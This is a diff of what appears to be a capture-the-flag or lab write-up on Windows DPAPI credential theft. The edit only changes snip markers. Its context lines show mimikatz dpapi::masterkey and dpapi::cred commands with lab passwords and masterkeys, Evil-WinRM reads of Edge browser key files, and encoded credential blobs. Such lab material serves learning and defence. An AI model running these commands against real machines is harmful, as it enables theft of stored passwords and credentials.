@@ -101,7 +101,7 @@ File Not Found
  Volume in drive C has no label.
  Volume Serial Number is C626-9388
 
-...[SNIP]...
+---[SNIP]---
 
  Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
 
@@ -184,12 +184,12 @@ ERROR kull_m_kernel_ioctl ; CreateFile (0x00000002)
 mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
 **BLOB**
 
-...[SNIP]...
+---[SNIP]---
 
 mimikatz(commandline) # dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected
 **MASTERKEYS**
 
-...[SNIP]...
+---[SNIP]---
 
 [masterkey] with password: D43d4lusB1ll1ngB055 (protected user)
   key : 0d0f6c2fafd985bff92ff1371723795de81064978fbf37e4f0b87d5b9b1458077f4264e3e5c5c1407431fb21243b46415c018e34caa943b8c24d0c5834500e73
@@ -202,13 +202,13 @@ mimikatz(commandline) # dpapi::masterkey /in:C:\Users\billing_user\AppData\Roami
 mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
 **BLOB**
 
-...[SNIP]...
+---[SNIP]---
 
 Decrypting Credential:
  * volatile cache: GUID:{56a4e7f0-7ae5-4a66-86c8-abb9aa484acd};KeyHash:1312251fb1ae77dec889c6b88f391ad10bf59d87;Key:available
 **CREDENTIAL**
 
-...[SNIP]...
+---[SNIP]---
 
   TargetName     : Domain:interactive=DAEDALUS\svc_backup
   UnkData        : (null)
@@ -243,7 +243,7 @@ PS C:\programdata> .\mimikatz.exe "dpapi::masterkey /in:C:\users\PPotts\appdata\
 mimikatz(commandline) # dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
 **MASTERKEYS**
 
-...[SNIP]...
+---[SNIP]---
 
 [domainkey] with RPC
 [DC] 'office.htb' will be the domain
@@ -273,7 +273,7 @@ PS C:\programdata> .\mimikatz.exe "dpapi::cred /in:C:\users\PPotts\appdata\roami
 mimikatz(commandline) # dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
 **BLOB**
 
-...[SNIP]...
+---[SNIP]---
 
 Decrypting Credential:
  * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
@@ -674,7 +674,7 @@ type "C:\Users\<USER>\appdata\local\microsoft\edge\User Data\Local State"
 ```console {class="sample-code"}
 *Evil-WinRM* PS C:\Users\Bob.Wood\Documents> type "C:\Users\Bob.Wood\appdata\local\microsoft\edge\User Data\Local State"
 
-{"abusive_adblocker_etag":"\"1651629182\"",...[SNIP]...,"web_widget":{"disabled_due_extensions":false}}
+{"abusive_adblocker_etag":"\"1651629182\"",---[SNIP]---,"web_widget":{"disabled_due_extensions":false}}
 ```
 
 ```console
@@ -699,7 +699,7 @@ type C:\ProgramData\logindata
 -----BEGIN CERTIFICATE-----
 U1FMaXRlIGZvcm1hdCAzAAgAAQEAQCAgAAAAAgAAABsAAAAAAAAAAAAAABAAAAAE
 AAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC
-...[SNIP]...
+---[SNIP]---
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -----END CERTIFICATE-----
@@ -735,7 +735,7 @@ version: 1
 credential_guid: b'\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8cz\x00\xc0O\xc2\x97\xeb' 
 masterkey_version: 1 
 masterkey_guid: a8bd1009-f2ac-43ca-9266-8e029f503e11 
-...[SNIP]...
+---[SNIP]---
 ```
 
 <small>*Ref: [pypykatz](https://github.com/skelsec/pypykatz)*</small>
@@ -764,7 +764,7 @@ type C:\ProgramData\<MASTERKEY_GUID>
 -----BEGIN CERTIFICATE-----
 AgAAAAAAAAAAAAAAYQA4AGIAZAAxADAAMAA5AC0AZgAyAGEAYwAtADQAMwBjAGEA
 LQA5ADIANgA2AC0AOABlADAAMgA5AGYANQAwADMAZQAxADEAAAAAAAAAAAAAAAAA
-...[SNIP]...
+---[SNIP]---
 Lfcxq7UBteEZCQAtS7mfZjvwI0i15/4rq8bYRxtwgc4PHUWN+jWNqjWLubp5NiV8
 4TpmPxZFTXNgcAL1Yueop4Y1qcl/l+CeAGfwc3viVD2hESIAK6Zm3OFAByjsyxUh
 29h5Ie/21Ms2D8kNzPms0rzLbXA=
